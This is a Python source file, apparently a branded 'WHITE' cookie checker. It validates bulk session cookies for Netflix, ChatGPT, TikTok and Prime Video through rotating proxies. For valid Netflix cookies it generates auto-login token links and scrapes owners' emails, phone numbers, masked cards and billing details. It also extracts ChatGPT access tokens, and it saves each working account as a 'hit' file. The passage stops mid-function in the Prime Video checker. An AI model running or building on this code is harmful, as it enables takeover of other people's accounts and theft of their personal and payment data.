"""
Cookie Checker Engine — Netflix, ChatGPT, TikTok
"""
import re
import json
import time
import zipfile
import threading
import requests
from datetime import datetime
from typing import Dict, List, Tuple, Optional

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass


# ─── Proxy helpers ────────────────────────────────────────────────────────────

_px_lock = threading.Lock()
_px_idx = 0
_dead_px: set = set()


def _proxy_str_to_requests(p: str) -> Optional[dict]:
    if not p:
        return None
    try:
        if p.startswith("socks5://") or p.startswith("socks5h://") or p.startswith("socks4://"):
            return {"http": p, "https": p}
        parts = p.split(":")
        if len(parts) == 4:
            url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            url = f"http://{parts[0]}:{parts[1]}"
        else:
            url = p if p.startswith("http") or p.startswith("socks") else f"http://{p}"
        return {"http": url, "https": url}
    except:
        return None


def _next_proxy(proxies_list: List[str]) -> Optional[dict]:
    global _px_idx, _dead_px
    if not proxies_list:
        return None
    with _px_lock:
        attempts = 0
        while attempts < len(proxies_list) * 2:
            p = proxies_list[_px_idx % len(proxies_list)]
            _px_idx += 1
            attempts += 1
            if p not in _dead_px:
                d = _proxy_str_to_requests(p)
                if d:
                    _px_raw[d["http"]] = p
                return d
        _dead_px.clear()
        p = proxies_list[_px_idx % len(proxies_list)]
        _px_idx += 1
        d = _proxy_str_to_requests(p)
        if d:
            _px_raw[d["http"]] = p
        return d


_px_raw = {}  # proxy-url -> raw "ip:port" string (for dead tracking)


def _mark_dead(proxy_dict: Optional[dict]):
    if proxy_dict:
        with _px_lock:
            url = proxy_dict.get("http", "")
            raw = _px_raw.get(url, url)
            if raw:
                _dead_px.add(raw)


# ─── Generic Cookie Parser ────────────────────────────────────────────────────

def _parse_cookies_from_text(text: str) -> Dict[str, str]:
    text = text.strip()
    if not text:
        return {}
    try:
        if text.startswith('[') or text.startswith('{'):
            data = json.loads(text)
            if isinstance(data, list):
                cookies = {}
                for item in data:
                    if isinstance(item, dict):
                        name = item.get("name", item.get("Name", ""))
                        value = item.get("value", item.get("Value", ""))
                        if name and value is not None:
                            cookies[str(name)] = str(value)
                return cookies
            elif isinstance(data, dict):
                return {str(k): str(v) for k, v in data.items()}
    except:
        pass
    cookies = {}
    for line in text.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            name = parts[5].strip()
            value = parts[6].strip()
            if name:
                cookies[name] = value
            continue
        if '=' in line and not line.startswith('http'):
            kv = line.split('=', 1)
            if len(kv) == 2:
                name = kv[0].strip().strip('"')
                value = kv[1].strip().strip(';').strip('"')
                if name and len(name) > 1 and not name.startswith('.'):
                    cookies[name] = value
    return cookies


def extract_cookie_files(content: bytes, filename: str) -> List[Tuple[str, str]]:
    """Extract (source_name, text) pairs from .txt or .zip bytes"""
    import io
    files = []
    if filename.lower().endswith('.zip'):
        try:
            with zipfile.ZipFile(io.BytesIO(content)) as zf:
                for name in zf.namelist():
                    if name.lower().endswith('.txt') and '__MACOSX' not in name:
                        try:
                            text = zf.read(name).decode('utf-8', errors='ignore')
                            if text.strip():
                                files.append((name, text))
                        except:
                            pass
        except:
            pass
    else:
        text = content.decode('utf-8', errors='ignore')
        if text.strip():
            files.append((filename, text))
    return files


def _format_number(n) -> str:
    try:
        n = int(n)
        if n >= 1_000_000:
            return f"{n/1_000_000:.1f}M"
        elif n >= 1000:
            return f"{n/1000:.1f}K"
        return str(n)
    except:
        return str(n)


# ─── Netflix ─────────────────────────────────────────────────────────────────

_NETFLIX_REQUIRED = ['NetflixId', 'SecureNetflixId', 'nfvdid']


def is_valid_netflix(d: dict) -> bool:
    return all(k in d for k in _NETFLIX_REQUIRED)


def count_valid_netflix(files: List[Tuple[str, str]]) -> Tuple[int, List[Tuple[str, dict]]]:
    result = []
    for src, text in files:
        d = _parse_cookies_from_text(text)
        if is_valid_netflix(d):
            result.append((src, d))
    return len(result), result


def check_netflix_cookie(cookies_dict: dict, proxies_list: List[str]) -> Tuple[Optional[dict], str]:
    px = None
    try:
        px = _next_proxy(proxies_list) if proxies_list else None
        cookie_str = '; '.join(f"{k}={v}" for k, v in cookies_dict.items())
        headers = {
            'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
            'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
            'Content-Type': 'application/json',
            'Cookie': cookie_str,
            'Origin': 'https://www.netflix.com',
            'Referer': 'https://www.netflix.com/'
        }
        payload = {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
            "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}
        }
        r = requests.post(
            'https://android13.prod.ftl.netflix.com/graphql',
            headers=headers, json=payload, proxies=px,
            timeout=(6, 12), verify=False
        )
        if r.status_code in [401, 403]:
            return None, 'expired'
        if r.status_code != 200:
            if px:
                _mark_dead(px)
            return None, 'error'
        data = r.json()
        if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
            token = data['data']['createAutoLoginToken']
            info = {"token": token, "link": f"https://netflix.com/?nftoken={token}"}

            # ── FULL account details (YourAccount page — NetflixBot.py method) ──
            try:
                session2 = requests.Session()
                session2.cookies.update(cookies_dict)
                h2 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml',
                    'Accept-Language': 'en-US,en;q=0.9',
                }
                txt = ""
                for url in ('https://www.netflix.com/YourAccount',
                            'https://www.netflix.com/account',
                            'https://www.netflix.com/account/membership'):
                    try:
                        rr = session2.get(url, headers=h2, proxies=px, timeout=(6, 15),
                                          verify=False, allow_redirects=True)
                        if rr.status_code == 200 and 'Account' in rr.text and 'login' not in rr.url.lower():
                            txt = rr.text
                            break
                    except Exception:
                        continue

                if txt:
                    def _f(pat):
                        m = re.search(pat, txt)
                        return m.group(1) if m else None

                    info['name'] = _f(r'"accountOwnerName"\s*:\s*"([^"]+)"') or _f(r'"firstName"\s*:\s*"([^"]+)"') or 'N/A'
                    info['email'] = _f(r'"emailAddress"\s*:\s*"([^"]+)"') or _f(r'"email"\s*:\s*"([^"]+)"') or _f(r'"loginId"\s*:\s*"([^"]+)"') or 'N/A'
                    _plan = _f(r'localizedPlanName.{1,50}?value":"([^"]+)"') or _f(r'"planName"\s*:\s*"([^"]+)"')
                    info['plan'] = _plan or 'N/A'
                    info['country'] = (_f(r'"countryOfSignup"\s*:\s*"([^"]+)"') or _f(r'"currentCountry"\s*:\s*"([^"]+)"')
                                       or _f(r'"countryCode"\s*:\s*"([^"]+)"') or 'N/A')
                    info['member_since'] = _f(r'"memberSince":"([^"]+)"') or 'N/A'
                    info['next_billing'] = (_f(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
                                            or _f(r'"nextBilling"[^}]*"value":"([^"]+)"') or 'N/A')
                    info['plan_price'] = (_f(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
                                          or _f(r'"formattedPlanPrice"\s*:\s*"([^"]+)"') or 'N/A')
                    info['payment_method'] = (_f(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
                                              or _f(r'"paymentMethodType"\s*:\s*"([^"]+)"') or 'N/A')
                    info['masked_card'] = _f(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"') or _f(r'"displayText"\s*:\s*"([^"]+)"') or 'N/A'
                    info['phone'] = _f(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"') or _f(r'"phoneNumber"\s*:\s*"([^"]+)"') or 'N/A'
                    info['phone_verified'] = "Yes" if '"isVerified":true' in txt else ("No" if '"isVerified":false' in txt else 'N/A')
                    info['video_quality'] = (_f(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
                                             or _f(r'"maxVideoQuality"\s*:\s*"([^"]+)"') or 'N/A')
                    info['max_streams'] = (_f(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
                                           or _f(r'"maxStreams"\s*:\s*"?([0-9]+)"?') or 'N/A')
                    info['on_hold'] = "Yes" if '"isUserOnHold":true' in txt else ("No" if '"isUserOnHold":false' in txt else 'N/A')
                    info['extra_member'] = "Yes" if '"showExtraMemberSection":{"fieldType":"Boolean","value":true' in txt else 'N/A'
                    info['email_verified'] = "Yes" if '"emailVerified":true' in txt else ("No" if '"emailVerified":false' in txt else 'N/A')
                    _ms = _f(r'"membershipStatus":\s*"([^"]+)"')
                    info['membership_status'] = _ms or 'N/A'
                    info['is_premium'] = (_ms == 'CURRENT_MEMBER') if _ms else bool(info['plan'] != 'N/A' and 'free' not in str(info['plan']).lower())

                    # profiles list
                    try:
                        rp = session2.get("https://www.netflix.com/ManageProfiles", headers=h2,
                                          proxies=px, timeout=(5, 10), verify=False)
                        if rp.status_code == 200:
                            profs = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text) or \
                                    re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text)
                            if profs:
                                info['profiles'] = ", ".join(profs[:8])
                    except Exception:
                        pass

                    # ── NFToken expiry (iOS FTL API — NetflixBot.py method) ──
                    try:
                        _nf_id = cookies_dict.get('NetflixId', '')
                        if _nf_id:
                            _ios_headers = {
                                "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
                                "Cookie": f"NetflixId={_nf_id}",
                                "x-netflix.client.type": "argo",
                            }
                            _ios_params = {
                                "appVersion": "15.48.1",
                                "device_type": "NFAPPL-02-",
                                "idiom": "phone",
                                "languages": "en-US",
                                "locale": "en-US",
                                "path": '["account","token","default"]',
                                "pathFormat": "graph",
                                "responseFormat": "json",
                            }
                            _ir = requests.get("https://ios.prod.ftl.netflix.com/iosui/user/15.48",
                                               params=_ios_params, headers=_ios_headers,
                                               proxies=px, timeout=(5, 10), verify=False)
                            if _ir.status_code == 200:
                                _ij = _ir.json()
                                _td = ((((_ij.get("value") or {}).get("account") or {})
                                        .get("token") or {}).get("default") or {})
                                _exp = _td.get("expires")
                                if isinstance(_exp, int):
                                    if len(str(_exp)) == 13:
                                        _exp //= 1000
                                    info['token_expiry'] = datetime.utcfromtimestamp(_exp).strftime("%Y-%m-%d %H:%M UTC")
                    except Exception:
                        pass
            except Exception:
                pass
            return info, 'valid'
        elif 'errors' in data:
            return None, 'expired'
        return None, 'error'
    except requests.exceptions.ProxyError:
        if px:
            _mark_dead(px)
        return None, 'proxy_error'
    except:
        return None, 'error'


def _netscape_netflix(d: dict) -> str:
    lines = ["# Netscape HTTP Cookie File", "# Netflix Cookies - WHITE Checker | Owner: @ADI_WT", ""]
    for name, value in d.items():
        lines.append(f".netflix.com\tTRUE\t/\tTRUE\t0\t{name}\t{value}")
    return "\n".join(lines)


def format_hit_netflix(result: dict, cookies_dict: dict, source: str) -> Tuple[str, str]:
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    token = result['token']
    netscape = _netscape_netflix(cookies_dict)
    content = f"""════════════════════════════════════════════════════════
  WHITE Netflix Cookie Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

  Email      : {result.get('email', 'N/A')}
  Name       : {result.get('name', 'N/A')}
  Plan       : {result.get('plan', 'N/A')} ({result.get('plan_price', 'N/A')})
  Status     : {result.get('membership_status', 'N/A')}
  Country    : {result.get('country', 'N/A')}
  Quality    : {result.get('video_quality', 'N/A')} • Streams: {result.get('max_streams', 'N/A')}
  Billing    : {result.get('next_billing', 'N/A')}
  Payment    : {result.get('payment_method', 'N/A')} {result.get('masked_card', '')}
  Phone      : {result.get('phone', 'N/A')} (Verified: {result.get('phone_verified', 'N/A')})
  Email Ver. : {result.get('email_verified', 'N/A')}
  On Hold    : {result.get('on_hold', 'N/A')} • Extra Member: {result.get('extra_member', 'N/A')}
  Profiles   : {result.get('profiles', 'N/A')}
  Since      : {result.get('member_since', 'N/A')}

  NFToken    : {token}
  Expires    : {result.get('token_expiry', 'N/A')}

  Phone Link : https://www.netflix.com/unsupported?nftoken={token}
  Desk Link  : https://www.netflix.com/browse?nftoken={token}
  TV Link    : https://www.netflix.com/tv8?nftoken={token}

════════════════════════════════════════════════════════
  COOKIES (Netscape Format)
════════════════════════════════════════════════════════
{netscape}

════════════════════════════════════════════════════════
  RAW COOKIES (JSON)
════════════════════════════════════════════════════════
{json.dumps(cookies_dict, indent=2, ensure_ascii=False)}

════════════════════════════════════════════════════════
  Owner: @ADI_WT | WHITE Netflix Cookie Checker
════════════════════════════════════════════════════════
"""
    safe_src = re.sub(r'[<>:"/\\|?*\s]', '_', source).replace('.txt', '')
    safe_plan = re.sub(r'[<>:"/\\|?*\s]', '_', str(result.get('plan', 'na'))[:15])
    safe_cty = re.sub(r'[<>:"/\\|?*\s]', '_', str(result.get('country', 'na'))[:8])
    filename = f"[{safe_plan}][{safe_cty}][{safe_src}].txt"
    return content, filename


# ─── ChatGPT ──────────────────────────────────────────────────────────────────

_GPT_SESSION_KEYS = [
    '__Secure-next-auth.session-token',
    '__Secure-next-auth.session-token.0',
    '__Secure-next-auth.session-token.1',
    'oai-sc'
]


def is_valid_chatgpt(d: dict) -> bool:
    return any(k in d for k in _GPT_SESSION_KEYS)


def count_valid_chatgpt(files: List[Tuple[str, str]]) -> Tuple[int, List[Tuple[str, dict]]]:
    result = []
    for src, text in files:
        d = _parse_cookies_from_text(text)
        if is_valid_chatgpt(d):
            result.append((src, d))
    return len(result), result


def check_chatgpt_cookie(cookies_dict: dict, proxies_list: List[str]) -> Tuple[Optional[dict], str]:
    px = None
    try:
        px = _next_proxy(proxies_list) if proxies_list else None
        headers = {
            "authority": "chatgpt.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        }
        # Step 1: backend-api/me — AUTHORITATIVE auth check (401 = session dead)
        try:
            r_me = requests.get(
                "https://chatgpt.com/backend-api/me",
                cookies=cookies_dict,
                headers={**headers, "accept": "application/json"},
                proxies=px, timeout=(6, 12), verify=False
            )
        except requests.exceptions.ProxyError:
            if px:
                _mark_dead(px)
            return None, 'proxy_error'
        except:
            return None, 'error'

        if r_me.status_code in (401, 403):
            return None, 'expired'
        if r_me.status_code != 200:
            return None, 'error'

        me_email, me_name = "N/A", "N/A"
        try:
            me = r_me.json()
            me_email = me.get("email", "N/A")
            me_name = me.get("name", "N/A")
            if not me_email or me_email == "N/A":
                return None, 'expired'   # JSON received but no user = logged out
        except:
            return None, 'error'

        # Step 2: homepage se plan info
        r = requests.get(
            "https://chatgpt.com/",
            cookies=cookies_dict, headers=headers,
            proxies=px, timeout=(6, 12),
            allow_redirects=True, verify=False
        )
        if r.status_code != 200:
            if px:
                _mark_dead(px)
            return None, 'error'
        if "login" in r.url.lower() or "auth0" in r.url.lower():
            return None, 'expired'

        data = r.text
        scripts = re.findall(r'<script[^>]*id="client-bootstrap"[^>]*>(.*?)</script>', data, re.DOTALL)
        for script in scripts:
            try:
                js = json.loads(script)
                if js.get("authStatus") == "logged_in":
                    user = js.get("session", {}).get("user", {})
                    account = js.get("session", {}).get("account", {})
                    session = js.get("session", {})
                    plan = account.get("planType", "N/A")
                    is_paid = bool(plan and plan.lower() not in ("free", "n/a", ""))
                    country = "N/A"
                    try:
                        import urllib.parse
                        ci_str = cookies_dict.get("oai-client-auth-info", "")
                        if ci_str:
                            ci = json.loads(urllib.parse.unquote(ci_str))
                            country = ci.get("country", "N/A")
                    except:
                        pass
                    return {
                        "name": user.get("name") or me_name,
                        "email": user.get("email") or me_email,
                        "plan": plan,
                        "is_paid": is_paid,
                        "expires": session.get("expires", "N/A"),
                        "access_token": session.get("accessToken", "N/A"),
                        "features": account.get("features", []),
                        "entitlement": account.get("entitlement", {}),
                        "rate_limits": account.get("rate_limits", []),
                        "country": country,
                    }, 'valid'
            except:
                continue

        if "logged_in" in data:
            em = re.search(r'"email"\s*:\s*"([^"]+)"', data)
            pl = re.search(r'"planType"\s*:\s*"([^"]+)"', data)
            nm = re.search(r'"name"\s*:\s*"([^"]+)"', data)
            if em:
                plan = pl.group(1) if pl else "N/A"
                return {
                    "name": nm.group(1) if nm else "N/A",
                    "email": em.group(1),
                    "plan": plan,
                    "is_paid": bool(plan and plan.lower() not in ("free", "n/a", "")),
                    "expires": "N/A", "access_token": "N/A",
                    "features": [], "entitlement": {}, "rate_limits": [], "country": "N/A",
                }, 'valid'
        return None, 'expired'
    except requests.exceptions.ProxyError:
        if px:
            _mark_dead(px)
        return None, 'proxy_error'
    except:
        return None, 'error'


def _netscape_chatgpt(d: dict) -> str:
    lines = ["# Netscape HTTP Cookie File", "# ChatGPT Cookies - WHITE Checker | Owner: @ADI_WT", ""]
    for name, value in d.items():
        secure = "TRUE" if name.startswith("__Secure") or name.startswith("__Host") else "FALSE"
        lines.append(f".chatgpt.com\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
    return "\n".join(lines)


def format_hit_chatgpt(result: dict, cookies_dict: dict, source: str) -> Tuple[str, str]:
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    netscape = _netscape_chatgpt(cookies_dict)
    token = result.get("access_token", "N/A")
    if token and token != "N/A" and len(token) > 80:
        token = token[:40] + "..." + token[-40:]
    features_str = "\n".join(f"  - {f}" for f in result.get("features", [])) or "  N/A"
    rate_str = "\n".join(
        f"  - {rl.get('model','?')}: {rl.get('limit','?')} per {rl.get('window','?')}s"
        for rl in result.get("rate_limits", [])
    ) or "  N/A"
    ent_str = "\n".join(f"  - {k}: {v}" for k, v in result.get("entitlement", {}).items()) or "  N/A"
    content = f"""════════════════════════════════════════════════════════
  WHITE ChatGPT Cookie Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

  Name       : {result.get('name', 'N/A')}
  Email      : {result.get('email', 'N/A')}
  Plan       : {result.get('plan', 'N/A')}
  Paid       : {'Yes' if result.get('is_paid') else 'No'}
  Country    : {result.get('country', 'N/A')}
  Expires    : {result.get('expires', 'N/A')}
  Token      : {token}

════════════════════════════════════════════════════════
  FEATURES
════════════════════════════════════════════════════════
{features_str}

════════════════════════════════════════════════════════
  RATE LIMITS
════════════════════════════════════════════════════════
{rate_str}

════════════════════════════════════════════════════════
  ENTITLEMENT
════════════════════════════════════════════════════════
{ent_str}

════════════════════════════════════════════════════════
  COOKIES (Netscape Format)
════════════════════════════════════════════════════════
{netscape}

════════════════════════════════════════════════════════
  RAW COOKIES (JSON)
════════════════════════════════════════════════════════
{json.dumps(cookies_dict, indent=2, ensure_ascii=False)}

════════════════════════════════════════════════════════
  Owner: @ADI_WT | WHITE ChatGPT Cookie Checker
════════════════════════════════════════════════════════
"""
    safe_plan = re.sub(r'[<>:"/\|?*\s]', '_', result.get("plan", "unknown").lower())
    safe_email = re.sub(r'[<>:"/\|?*\s]', '_', result.get("email", "unknown"))
    filename = f"[{safe_plan}][{safe_email}].txt"
    return content, filename
# ─── TikTok ───────────────────────────────────────────────────────────────────

_TIKTOK_SESSION_KEYS = ['sessionid', 'sid_tt']


def is_valid_tiktok(d: dict) -> bool:
    return any(k in d for k in _TIKTOK_SESSION_KEYS)


def count_valid_tiktok(files: List[Tuple[str, str]]) -> Tuple[int, List[Tuple[str, dict]]]:
    result = []
    for src, text in files:
        d = _parse_cookies_from_text(text)
        if is_valid_tiktok(d):
            result.append((src, d))
    return len(result), result


def check_tiktok_cookie(cookies_dict: dict, proxies_list: List[str]) -> Tuple[Optional[dict], str]:
    px = None
    try:
        px = _next_proxy(proxies_list) if proxies_list else None
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.tiktok.com/',
        }
        r = requests.get(
            'https://www.tiktok.com/passport/web/account/info/',
            cookies=cookies_dict, headers=headers,
            proxies=px, timeout=(5, 10),
            allow_redirects=True, verify=False
        )
        if r.status_code != 200:
            if px:
                _mark_dead(px)
            return None, 'error'
        try:
            data = r.json()
        except:
            return None, 'error'

        error_code = data.get('error_code') or data.get('code') or 0
        if error_code in [8, 13, 10, 2483, 2484]:
            return None, 'expired'
        combo = (str(data.get('message', '')) + ' ' + str(data.get('description', ''))).lower()
        if any(w in combo for w in ['expired', 'login', 'unauthorized', 'invalid', 'need login', 'not logged']):
            return None, 'expired'

        acc = data.get('data', {})
        if not acc or not acc.get('username'):
            return None, 'expired'

        username = acc['username']
        stats = {'nickname': '', 'followers': 0, 'following': 0, 'likes': 0, 'videos': 0}
        try:
            r2 = requests.get(
                f'https://www.tiktok.com/api/user/detail/?uniqueId={username}',
                cookies=cookies_dict, headers=headers,
                proxies=px, timeout=(5, 8), verify=False
            )
            if r2 and r2.status_code == 200:
                d2 = r2.json()
                ui = d2.get('userInfo', {})
                u2 = ui.get('user', {})
                s2 = ui.get('stats', {})
                if u2.get('uniqueId', '').lower() == username.lower():
                    stats = {
                        'nickname': u2.get('nickname', ''),
                        'followers': s2.get('followerCount', 0),
                        'following': s2.get('followingCount', 0),
                        'likes': s2.get('heartCount', 0),
                        'videos': s2.get('videoCount', 0),
                    }
        except:
            pass

        return {
            "username": username,
            "nickname": stats['nickname'],
            "followers": stats['followers'],
            "following": stats['following'],
            "likes": stats['likes'],
            "videos": stats['videos'],
            "profile": f"https://www.tiktok.com/@{username}",
        }, 'valid'
    except requests.exceptions.ProxyError:
        if px:
            _mark_dead(px)
        return None, 'proxy_error'
    except:
        return None, 'error'


def _netscape_tiktok(d: dict) -> str:
    lines = ["# Netscape HTTP Cookie File", "# TikTok Cookies - WHITE Checker | Owner: @ADI_WT", ""]
    priority = ['sessionid', 'sid_tt', 'uid_tt', 'odin_tt', 'ttwid']
    keys_sorted = [k for k in priority if k in d] + [k for k in d if k not in priority]
    for name in keys_sorted:
        lines.append(f".tiktok.com\tTRUE\t/\tFALSE\t0\t{name}\t{d[name]}")
    return "\n".join(lines)


def format_hit_tiktok(result: dict, cookies_dict: dict, source: str) -> Tuple[str, str]:
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    netscape = _netscape_tiktok(cookies_dict)
    username = result.get('username', 'unknown')
    content = f"""════════════════════════════════════════════════════════
  WHITE TikTok Cookie Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

  Username   : @{username}
  Nickname   : {result.get('nickname', 'N/A')}
  Followers  : {_format_number(result.get('followers', 0))}
  Following  : {_format_number(result.get('following', 0))}
  Likes      : {_format_number(result.get('likes', 0))}
  Videos     : {result.get('videos', 0)}
  Profile    : {result.get('profile', 'N/A')}

════════════════════════════════════════════════════════
  COOKIES (Netscape Format)
════════════════════════════════════════════════════════
{netscape}

════════════════════════════════════════════════════════
  RAW COOKIES (JSON)
════════════════════════════════════════════════════════
{json.dumps(cookies_dict, indent=2, ensure_ascii=False)}

════════════════════════════════════════════════════════
  Owner: @ADI_WT | WHITE TikTok Cookie Checker
════════════════════════════════════════════════════════
"""
    safe_user = re.sub(r'[<>:"/\\|?*\s]', '_', username)
    filename = f"[@{safe_user}][{result.get('followers', 0)}_followers].txt"
    return content, filename


# ─── Prime Video ──────────────────────────────────────────────────────────────

_PV_REQUIRED = ("session-token", "x-main-av", "at-main", "ubid-main")


def is_valid_primevideo(d: dict) -> bool:
    return any(k in d for k in _PV_REQUIRED)


def count_valid_primevideo(files: List[Tuple[str, str]]) -> Tuple[int, List[Tuple[str, dict]]]:
    result = []
    for src, text in files:
        d = _parse_cookies_from_text(text)
        if is_valid_primevideo(d):
            result.append((src, d))
    return len(result), result


def _pv_find_first_value(obj, target_keys):
    if isinstance(target_keys, str):
        target_keys = {target_keys}
    else:
        target_keys = set(target_keys)
    if isinstance(obj, dict):
        for key, value in obj.items():
            if key in target_keys and value not in (None, ""):
                return value
            nested = _pv_find_first_value(value, target_keys)
            if nested not in (None, ""):
                return nested
    elif isinstance(obj, list):
        for item in obj:
            nested = _pv_find_first_value(item, target_keys)
            if nested not in (None, ""):
                return nested
    return None


def check_primevideo_cookie(cookies_dict: dict, proxies_list: List[str]) -> Tuple[Optional[dict], str]:
    px = None
    try:
        px = _next_proxy(proxies_list) if proxies_list else None
        headers = {
            "Host": "www.primevideo.com", "Connection": "keep-alive",
            "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Accept": "text/html,*/*;q=0.8", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Accept-Encoding": "identity"
        }
        session = requests.Session()
        session.cookies.update(cookies_dict)
        session.headers.update({"Accept-Encoding": "identity"})

        r = session.get("https://www.primevideo.com/region/eu/storefront", headers=headers, timeout=(8, 15), allow_redirects=True)
        sc = r.status_code
        if sc != 200:
            return None, f'HTTP {sc}'
        if "signin" in r.url.lower() or "ap/signin" in r.url.lower():
            return None, 'Logged out'

        # Check config
        h2 = dict(headers)
        h2.update({"Host": "atv-ps.primevideo.com", "Accept": "application/json, text/plain, */*", "Referer": "https://www.primevideo.com/region/eu/storefront"})
        cr = session.get("https://atv-ps.primevideo.com/acm/GetConfiguration/WebClient?deviceTypeID=AOAGZA014O5RE&deviceID=Web", headers=h2, timeout=(5, 8), allow_redirects=True)

        if "signin" in cr.url.lower() or "ap/signin" in cr.url.lower():
            return None, 'Logged out'
        if cr.status_code != 200:
            return None, f'Config HTTP {cr.status_code}'

        try:
            cd = cr.json() or {}
        except:
            cd = {}

        cid = ""
        if isinstance(cd, dict):
            cid = str(_pv_find_first_value(cd, {"customerID", "customerId"}) or "").strip()
        if not cid:
            cm = re.search(r'"customerID"\s*:\s*"([^"]*)"', cr.text or "", re.I)
            if not cm:
                cm = re.search(r'"customerId"\s*:\s*"([^"]*)"', cr.text or "", re.I)
            if cm:
                cid = cm.group(1)
        if not cid:
            return None, 'No customer ID'

        # ── REAL API: subscribed channels (captured from devtools) ──
        # GET www.primevideo.com/api/enrichNav?enrichmentType=GET_CHANNELS — only cookies needed
        channels_list = []
        channels_api_paid = None
        try:
            ch_headers = {
                "User-Agent": headers["User-Agent"],
                "Accept": "*/*",
                "Referer": "https://www.primevideo.com/",
                "X-Requested-With": "XMLHttpRequest",
            }
            chr_ = session.get(
                "https://www.primevideo.com/api/enrichNav?enrichmentType=GET_CHANNELS",
                headers=ch_headers, timeout=(5, 10), allow_redirects=True)
            if chr_.status_code == 200:
                chd = chr_.json()
                raw_channels = chd.get("channels", []) if isinstance(chd, dict) else []
                for ch in raw_channels:
                    if isinstance(ch, dict):
                        name = ch.get("label") or ch.get("name") or ch.get("title") or ch.get("channelId") or ""
                        if name:
                            channels_list.append(str(name))
                # Non-empty channels = confirmed paid subscription(s)
                if channels_list:
                    channels_api_paid = True
        except Exception:
            pass

        # Check plan — multi-marker detection (accuracy improved)
        wm = re.search(r'"watchlistAction"\s*:\s*\{\s*"ajaxEnabled"\s*:\s*(true|false|null)', r.text, re.I)
        wv = wm.group(1).lower() if wm else ""

        paid_score, free_score = 0, 0
        if wv == "true":
            paid_score += 2
        elif wv == "false":
            free_score += 2

        low_html = (r.text or "").lower()
        # Free markers (user ko subscribe karne bola ja raha hai)
        if re.search(r"subscribe now", r.text, re.I):
            free_score += 2
        if "start your free trial" in low_html or "join prime" in low_html or "try prime free" in low_html:
            free_score += 2
        if "with ads" in low_html and "prime" in low_html:
            free_score += 1
        # Paid markers (active prime session indicators)
        if '"isprimecustomer":true' in low_html or '"primecustomer":true' in low_html:
            paid_score += 3
        if "prime membership" in low_html and "manage" in low_html:
            paid_score += 2
        if 'data-testid="pv-nav-my-stuff"' in low_html or '"my stuff"' in low_html:
            paid_score += 1

        # Config JSON mein prime flags dhundo (atv-ps GetConfiguration)
        if isinstance(cd, dict):
            prime_flag = _pv_find_first_value(cd, {"isPrimeCustomer", "primeCustomer", "hasPrime", "primeMembershipStatus"})
            if isinstance(prime_flag, bool):
                if prime_flag:
                    paid_score += 3
                else:
                    free_score += 3
            elif isinstance(prime_flag, str):
                if prime_flag.lower() in ("active", "prime", "paid", "true"):
                    paid_score += 3
                elif prime_flag.lower() in ("free", "none", "false", "inactive"):
                    free_score += 3

        # Channels API (confirmed paid) sabse pehle
        if channels_api_paid is True:
            paid_score += 5
        if paid_score > free_score:
            is_paid = True
        elif free_score > paid_score:
            is_paid = False
        else:
            is_paid = None

        region = "Unknown"
        if isinstance(cd, dict):
            region = str(_pv_find_first_value(cd, "recordTerritory") or "Unknown").strip()

        profile = "Unknown"
        pm = re.search(r'data-testid="active-profile-([^"]+)"', r.text)
        if pm:
